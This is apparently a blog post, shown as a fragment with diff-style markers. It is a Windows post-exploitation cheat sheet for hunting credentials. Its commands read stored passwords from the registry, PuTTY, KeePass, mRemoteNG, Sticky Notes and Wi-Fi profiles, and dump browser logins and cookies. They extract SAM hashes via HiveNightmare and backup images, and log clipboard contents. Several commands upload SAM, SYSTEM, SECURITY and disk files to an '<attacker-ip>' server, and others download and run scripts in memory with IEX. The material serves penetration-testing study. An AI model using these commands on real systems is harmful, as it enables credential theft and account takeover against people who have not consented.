+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; Get-WmiObject -Class Win32_OperatingSystem | select Description</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="The-Registry"><a href="#The-Registry" class="headerlink" title="The Registry"></a>The Registry</h1><h4 id="Windows-AutoLogon"><a href="#Windows-AutoLogon" class="headerlink" title="Windows AutoLogon"></a>Windows AutoLogon</h4><blockquote>
+<p>➜ Check whether Windows AutoLogon is configured and retrieve any stored username and password.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Service-ImagePath-Credential-Hunting"><a href="#Service-ImagePath-Credential-Hunting" class="headerlink" title="Service ImagePath Credential Hunting"></a>Service ImagePath Credential Hunting</h4><blockquote>
+<p>➜ Search service ImagePath values for common credential-related keywords.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> HKLM:\SYSTEM\CurrentControlSet\Services | <span class="built_in">Get-ItemProperty</span> <span class="literal">-ErrorAction</span> SilentlyContinue | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.ImagePath <span class="operator">-match</span> <span class="string">&quot;pass|pwd|password|user|username|cred|login|-u |-p &quot;</span> &#125; | <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> ImagePath</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Display all service ImagePath values.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> HKLM:\SYSTEM\CurrentControlSet\Services | <span class="built_in">Get-ItemProperty</span> <span class="literal">-ErrorAction</span> SilentlyContinue | <span class="built_in">Select-Object</span> ImagePath</span><br></pre></td></tr></table></figure>
+
+<h4 id="PuTTY-Saved-Proxy-Credentials"><a href="#PuTTY-Saved-Proxy-Credentials" class="headerlink" title="PuTTY Saved Proxy Credentials"></a>PuTTY Saved Proxy Credentials</h4><blockquote>
+<p>Enumerate saved sessions (current user)</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Read a session and pull ProxyPassword</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; reg query <span class="string">&quot;HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\&lt;session-name&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ProxyUsername  REG_SZ  administrator</span></span><br><span class="line"><span class="comment"># ProxyPassword  REG_SZ  1_4m_th3_@!</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ If we have administrator privileges we can enumerate PuTTY sessions for all user profiles.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; for /f &quot;tokens=*&quot; %a in (&#x27;reg query HKU&#x27;) do @reg query &quot;%a\SOFTWARE\SimonTatham\PuTTY\Sessions&quot; 2&gt;nul</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="PowerShell-DPAPI-Credential-Files"><a href="#PowerShell-DPAPI-Credential-Files" class="headerlink" title="PowerShell DPAPI Credential Files"></a>PowerShell DPAPI Credential Files</h1><blockquote>
+<p>PowerShell credentials exported with <code>Export-Clixml</code> are stored in XML files and encrypted with DPAPI.</p>
+</blockquote>
+<blockquote>
+<p>➜ Find exported PowerShell credential files by content.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> C:\ <span class="literal">-Recurse</span> <span class="literal">-Include</span> *.xml <span class="operator">-File</span> <span class="literal">-ErrorAction</span> SilentlyContinue | <span class="built_in">Select-String</span> <span class="literal">-Pattern</span> <span class="string">&quot;System.Management.Automation.PSCredential&quot;</span> | <span class="built_in">Select-Object</span> Path <span class="literal">-Unique</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Import the file.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$credential</span> = <span class="built_in">Import-Clixml</span> <span class="literal">-Path</span> <span class="string">&quot;C:\path\to\pass.xml&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Read the username.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$credential</span>.GetNetworkCredential().UserName</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Read the password.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$credential</span>.GetNetworkCredential().Password</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Note: The password can usually be decrypted only by the same user on the same machine.</p>
+</blockquote>
+<h1 id="Chrome-Custom-Dictionary"><a href="#Chrome-Custom-Dictionary" class="headerlink" title="Chrome Custom Dictionary"></a>Chrome Custom Dictionary</h1><blockquote>
+<p>Find it across every user profile</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; Get-ChildItem &quot;C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt&quot; -ErrorAction SilentlyContinue</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Read and grep the matched file</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">gc</span> <span class="string">&#x27;C:\Users\&lt;user&gt;\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt&#x27;</span> | <span class="built_in">Select-String</span> password</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Sticky-Notes-Database"><a href="#Sticky-Notes-Database" class="headerlink" title="Sticky Notes Database"></a>Sticky Notes Database</h1><blockquote>
+<p>Sticky Notes is a built-in Windows application that lets users create quick notes on their desktop, users sometimes store passwords, credentials, or other sensitive information in these notes.</p>
+</blockquote>
+<blockquote>
+<p>Default path:</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Users\&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Find it across every user profile.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> <span class="string">&quot;C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite&quot;</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Read the stored notes using PSSQLite (external module), we need import it first.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> .\PSSQLite.psd1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-SqliteQuery</span> <span class="literal">-Database</span> <span class="string">&quot;C:\Users\&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite&quot;</span> <span class="literal">-Query</span> <span class="string">&quot;SELECT Text FROM Note&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Or transfer the Sticky Notes database to our machine and dump readable strings from the WAL file.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings plum.sqlite-wal</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Saved-Credentials-Vaults"><a href="#Saved-Credentials-Vaults" class="headerlink" title="Saved Credentials &amp; Vaults"></a>Saved Credentials &amp; Vaults</h1><h3 id="cmdkey-Stored-Credentials"><a href="#cmdkey-Stored-Credentials" class="headerlink" title="cmdkey Stored Credentials"></a>cmdkey Stored Credentials</h3><blockquote>
+<p>Windows can cache RDP&#x2F;terminal-services credentials we can’t read the plaintext, but we can reuse them.</p>
+</blockquote>
+<h5 id="List-cached-credentials-for-the-current-user"><a href="#List-cached-credentials-for-the-current-user" class="headerlink" title="List cached credentials for the current user"></a>List cached credentials for the current user</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; cmdkey /list</span><br></pre></td></tr></table></figure>
+
+<h5 id="Run-a-command-as-that-user-with-the-saved-credential"><a href="#Run-a-command-as-that-user-with-the-saved-credential" class="headerlink" title="Run a command as that user with the saved credential"></a>Run a command as that user with the saved credential</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; runas /savecred /user:&lt;domain&gt;\&lt;user&gt; &quot;&lt;command&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="KeePass-Database"><a href="#KeePass-Database" class="headerlink" title="KeePass Database"></a>KeePass Database</h3><blockquote>
+<p>A <code>.kdbx</code> file is a KeePass vault, usually behind one master password.</p>
+</blockquote>
+<blockquote>
+<p>Locate any KeePass DB on the host or shares</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; Get-ChildItem -Path C:\ -Recurse -Include *.kdbx -ErrorAction SilentlyContinue</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Extract the hash Locally</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">keepass2john &lt;database&gt;.kdbx &gt; keepass_hash</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Crack it offline</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="mRemoteNG-Configuration"><a href="#mRemoteNG-Configuration" class="headerlink" title="mRemoteNG Configuration"></a>mRemoteNG Configuration</h3><blockquote>
+<p><code>mRemoteNG</code> stores RDP&#x2F;SSH&#x2F;VNC credentials in <code>confCons.xml</code>, by default mRemoteNG encrypts credentials using a hardcoded master password : <code>mR3m</code> unless a custom one was set.</p>
+</blockquote>
+<blockquote>
+<p>Find confCons.xml for every user (generic)</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; Get-ChildItem &quot;C:\Users\*\AppData\Roaming\mRemoteNG\confCons.xml&quot; -ErrorAction SilentlyContinue</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>If the user did not set a custom master password, we can easily decrypt all saved credentials using <a href="https://github.com/haseebT/mRemoteNG-Decrypt">mRemoteNG-Decrypt</a></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ python3 mremoteng_decrypt.py -s <span class="string">&quot;Password_String&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>If a custom master password is used, we can attempt to brute-force it:</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ <span class="keyword">for</span> password <span class="keyword">in</span> $(<span class="built_in">cat</span> /usr/share/wordlists/fasttrack.txt);<span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$password</span>; python3 mremoteng_decrypt.py -s <span class="string">&quot;Password_String&quot;</span> -p <span class="variable">$password</span> 2&gt;/dev/null;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Browsers"><a href="#Browsers" class="headerlink" title="Browsers"></a>Browsers</h1><h3 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h3><h5 id="Saved-Logins"><a href="#Saved-Logins" class="headerlink" title="Saved Logins"></a>Saved Logins</h5><blockquote>
+<p>We can decrypt and dump Chrome’s saved logins (current user)</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; .\SharpChrome.exe logins /unprotect</span><br></pre></td></tr></table></figure>
+
+<h5 id="Chromium-Cookies"><a href="#Chromium-Cookies" class="headerlink" title="Chromium Cookies"></a>Chromium Cookies</h5><blockquote>
+<p>Chrome stores cookies in an SQLite database encrypted with DPAPI. If you can decrypt them as the current user, you may be able to reuse authenticated web sessions.</p>
+</blockquote>
+<blockquote>
+<p>Default location</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Users\&lt;user&gt;\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Older location</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Users\&lt;user&gt;\AppData\Local\Google\Chrome\User Data\Default\Cookies</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Load SharpChromium and dump all cookies</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-SharpChromium</span> <span class="literal">-Command</span> <span class="string">&quot;cookies&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>If the tool cannot find the cookie database, copy it from the new location and re-run.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="string">&quot;<span class="variable">$env:LOCALAPPDATA</span>\Google\Chrome\User Data\Default\Network\Cookies&quot;</span> <span class="string">&quot;<span class="variable">$env:LOCALAPPDATA</span>\Google\Chrome\User Data\Default\Cookies&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-SharpChromium</span> <span class="literal">-Command</span> <span class="string">&quot;cookies&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Firefox-Cookies"><a href="#Firefox-Cookies" class="headerlink" title="Firefox Cookies"></a>Firefox Cookies</h3><blockquote>
+<p>Firefox stores cookies in an SQLite database (not protected by DPAPI). Each Firefox profile is stored in a randomly named folder.</p>
+</blockquote>
+<blockquote>
+<p>Locate the cookie database.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> <span class="string">&quot;C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite&quot;</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Transfer the database to our machine and extract cookies using cookieextractor</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 cookieextractor.py --dbpath <span class="string">&quot;&lt;path&gt;/cookies.sqlite&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Local-Credential-Stores-Memory-Hives"><a href="#Local-Credential-Stores-Memory-Hives" class="headerlink" title="Local Credential Stores (Memory &amp; Hives)"></a>Local Credential Stores (Memory &amp; Hives)</h1><h4 id="FileZilla-Server-Admin-Interface"><a href="#FileZilla-Server-Admin-Interface" class="headerlink" title="FileZilla Server Admin Interface"></a>FileZilla Server Admin Interface</h4><blockquote>
+<p>➜ FileZilla Server exposes a local administration interface on TCP port 14147, if accessible it may reveal FTP credentials or allow administrative actions.</p>
+</blockquote>
+<blockquote>
+<p>Check whether the FileZilla Server administration interface is running locally.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -ano | <span class="built_in">findstr</span> <span class="number">14147</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="HiveNightmare-SeriousSam-CVE-2021-36934"><a href="#HiveNightmare-SeriousSam-CVE-2021-36934" class="headerlink" title="HiveNightmare &#x2F; SeriousSam (CVE-2021-36934)"></a>HiveNightmare &#x2F; SeriousSam (CVE-2021-36934)</h4><blockquote>
+<p>HiveNightmare (SeriousSam) is a Windows vulnerability that allows low-privileged users to read the <code>SAM</code>, <code>SYSTEM</code>, and <code>SECURITY</code> registry hives from Volume Shadow Copies.</p>
+</blockquote>
+<blockquote>
+<p>Check if the machine is vulnerable.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">icacls C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Dump the registry hives from the shadow copies using HiveNightmare</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\HiveNightmare.exe</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Extract the password hashes from the dumped hives.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam SAM-&lt;<span class="built_in">date</span>&gt; -system SYSTEM-&lt;<span class="built_in">date</span>&gt; -security SECURITY-&lt;<span class="built_in">date</span>&gt; <span class="built_in">local</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Wi-Fi-Credentials"><a href="#Wi-Fi-Credentials" class="headerlink" title="Wi-Fi Credentials"></a>Wi-Fi Credentials</h4><blockquote>
+<p>With local admin on a host that has a Wi-Fi card.</p>
+</blockquote>
+<blockquote>
+<p>Enumerate all saved Wi-Fi profiles.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh wlan show profiles</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Display the password for a specific Wi-Fi profile.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh wlan show profile &quot;&lt;profile-name&gt;&quot; key=clear</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Dump the passwords for all saved Wi-Fi profiles.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">4</span> delims=: &quot; %a <span class="keyword">in</span> (&#x27;netsh wlan show profiles ^| <span class="built_in">findstr</span> &quot;All User Profile&quot;&#x27;) <span class="keyword">do</span> @netsh wlan show profile name=&quot;%a&quot; key=clear | <span class="built_in">findstr</span> &quot;SSID Key&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Shares-Backups-Virtual-Disks"><a href="#Shares-Backups-Virtual-Disks" class="headerlink" title="Shares, Backups &amp; Virtual Disks"></a>Shares, Backups &amp; Virtual Disks</h1><h3 id="Virtual-Disk-Images-VHD-VHDX-VMDK"><a href="#Virtual-Disk-Images-VHD-VHDX-VMDK" class="headerlink" title="Virtual Disk Images (VHD &#x2F; VHDX &#x2F; VMDK)"></a>Virtual Disk Images (VHD &#x2F; VHDX &#x2F; VMDK)</h3><blockquote>
+<p>Backup software and virtualization platforms often store entire systems as virtual disk images. These images may contain registry hives, configuration files, databases, and other sensitive data.</p>
+</blockquote>
+<blockquote>
+<p>Locate virtual disk images.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> C:\,D:\,E:\ <span class="literal">-Recurse</span> <span class="literal">-Include</span> *.vhd,*.vhdx,*.vmdk <span class="operator">-File</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Transfer the virtual disk to our machine.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ uploadserver</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">curl.exe <span class="operator">-F</span> <span class="string">&quot;files=@C:\Backups\Server01.vhdx&quot;</span> http://&lt;attacker<span class="literal">-ip</span>&gt;:<span class="number">8000</span>/upload</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Mount the virtual disk on our linux machine.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">guestmount -a &lt;disk&gt;.vmdk -i --ro /mnt/vmdk</span><br><span class="line"></span><br><span class="line">guestmount --add &lt;disk&gt;.vhdx --ro /mnt/vhdx -m /dev/sda1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Extract interesting files.</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Windows</span><br><span class="line">--------</span><br><span class="line">SAM</span><br><span class="line">SYSTEM</span><br><span class="line">SECURITY</span><br><span class="line">web.config</span><br><span class="line"></span><br><span class="line">Linux</span><br><span class="line">-----</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/ssh/</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Dump password hashes.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL</span><br></pre></td></tr></table></figure>
+
+<h3 id="Restic-Backups"><a href="#Restic-Backups" class="headerlink" title="Restic Backups"></a>Restic Backups</h3><blockquote>
+<p>Restic is a backup tool that can store backups of local or remote systems. If we compromise a backup server or recover the repository password, we may be able to restore files from multiple machines.</p>
+</blockquote>
+<blockquote>
+<p>With access to a Restic repository, we can:</p>
+<ul>
+<li>Enumerate available snapshots.</li>
+<li>Browse backed-up files and folders.</li>
+<li>Restore files from multiple systems.</li>
+<li>Recover sensitive files such as registry hives, configuration files, SSH keys, and databases.</li>
+</ul>
+</blockquote>
+<h5 id="Recover-the-Repository-Password"><a href="#Recover-the-Repository-Password" class="headerlink" title="Recover the Repository Password"></a>Recover the Repository Password</h5><blockquote>
+<p>During enumeration, search for backup scripts or configuration files containing the repository password.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Scripts\backup.ps1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Example output — the password is assigned to <code>$env:RESTIC_PASSWORD</code>:</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">$env:RESTIC_PASSWORD=&quot;PASSWORD&quot;</span><br><span class="line">restic.exe -r &lt;repository&gt; backup &lt;folder&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>The password may also appear in the PowerShell history.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Select-String</span> <span class="string">&quot;RESTIC_PASSWORD|restic.exe&quot;</span> (<span class="built_in">Get-PSReadLineOption</span>).HistorySavePath</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Example match:</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">$env:RESTIC_PASSWORD=&quot;PASSWORD&quot;</span><br><span class="line">restic.exe -r &lt;repository&gt; backup &lt;folder&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Locate-Restic-Repositories"><a href="#Locate-Restic-Repositories" class="headerlink" title="Locate Restic Repositories"></a>Locate Restic Repositories</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> C:\,D:\,E:\ <span class="literal">-Recurse</span> <span class="literal">-Filter</span> snapshots <span class="literal">-Directory</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Once the password is recovered, configure it for the current session.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$env:RESTIC_PASSWORD</span>=<span class="string">&quot;PASSWORD&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Enumerate-Snapshots"><a href="#Enumerate-Snapshots" class="headerlink" title="Enumerate Snapshots"></a>Enumerate Snapshots</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">restic.exe <span class="literal">-r</span> &lt;repository&gt; snapshots</span><br><span class="line"></span><br><span class="line">&lt;ID&gt;      &lt;time&gt;      &lt;target_server&gt;      &lt;backed_up_folder&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Browse-Snapshot-Contents"><a href="#Browse-Snapshot-Contents" class="headerlink" title="Browse Snapshot Contents"></a>Browse Snapshot Contents</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">restic.exe <span class="literal">-r</span> &lt;repository&gt; <span class="built_in">ls</span> &lt;snapshot<span class="literal">-id</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Restore-a-Snapshot"><a href="#Restore-a-Snapshot" class="headerlink" title="Restore a Snapshot"></a>Restore a Snapshot</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">restic.exe <span class="literal">-r</span> &lt;repository&gt; restore &lt;snapshot<span class="literal">-id</span>&gt; <span class="literal">--target</span> C:\Restore</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Example:</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; tree C:\Restore</span><br><span class="line"></span><br><span class="line">C:\RESTORE</span><br><span class="line">└───C</span><br><span class="line">    └───Windows</span><br><span class="line">        └───System32</span><br><span class="line">            └───config</span><br><span class="line">                SAM</span><br><span class="line">                SYSTEM</span><br><span class="line">                SECURITY</span><br></pre></td></tr></table></figure>
+
+<h5 id="Transfer-Interesting-Files"><a href="#Transfer-Interesting-Files" class="headerlink" title="Transfer Interesting Files"></a>Transfer Interesting Files</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ uploadserver</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">curl.exe <span class="operator">-F</span> <span class="string">&quot;files=@C:\Restore\C\Windows\System32\config\SAM&quot;</span> http://&lt;attacker<span class="literal">-ip</span>&gt;:<span class="number">8000</span>/upload</span><br><span class="line"></span><br><span class="line">curl.exe <span class="operator">-F</span> <span class="string">&quot;files=@C:\Restore\C\Windows\System32\config\SYSTEM&quot;</span> http://&lt;attacker<span class="literal">-ip</span>&gt;:<span class="number">8000</span>/upload</span><br><span class="line"></span><br><span class="line">curl.exe <span class="operator">-F</span> <span class="string">&quot;files=@C:\Restore\C\Windows\System32\config\SECURITY&quot;</span> http://&lt;attacker<span class="literal">-ip</span>&gt;:<span class="number">8000</span>/upload</span><br></pre></td></tr></table></figure>
+
+<h5 id="Extract-Password-Hashes"><a href="#Extract-Password-Hashes" class="headerlink" title="Extract Password Hashes"></a>Extract Password Hashes</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404ee:&lt;SNIP&gt;:bac9dc5bc04b477f26:::</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Live-Process-Command-Line-Monitoring"><a href="#Live-Process-Command-Line-Monitoring" class="headerlink" title="Live Process Command-Line Monitoring"></a>Live Process Command-Line Monitoring</h2><blockquote>
+<p>Monitor running processes and display newly started processes with their command-line arguments, this can reveal credentials passed to scheduled tasks, services, or scripts at runtime.</p>
+</blockquote>
+<blockquote>
+<p>Monitor new process command lines (save the script as <code>procmon.ps1</code>).</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="variable">$true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$process</span> = <span class="built_in">Get-WmiObject</span> Win32_Process | <span class="built_in">Select-Object</span> CommandLine</span><br><span class="line"><span class="built_in">Start-Sleep</span> <span class="number">1</span></span><br><span class="line"><span class="variable">$process2</span> = <span class="built_in">Get-WmiObject</span> Win32_Process | <span class="built_in">Select-Object</span> CommandLine</span><br><span class="line"><span class="built_in">Compare-Object</span> <span class="literal">-ReferenceObject</span> <span class="variable">$process</span> <span class="literal">-DifferenceObject</span> <span class="variable">$process2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Run the script in memory from our web server.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">iwr</span> <span class="string">&#x27;http://&lt;our-ip&gt;/procmon.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Clipboard-Monitoring"><a href="#Clipboard-Monitoring" class="headerlink" title="Clipboard Monitoring"></a>Clipboard Monitoring</h2><blockquote>
+<p>The Windows clipboard may temporarily contain passwords, 2FA codes, RDP clipboard contents, or other sensitive information copied by users.</p>
+</blockquote>
+<blockquote>
+<p>Download and load Invoke-Clipboard</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Start monitoring clipboard activity.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-ClipboardLogger</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
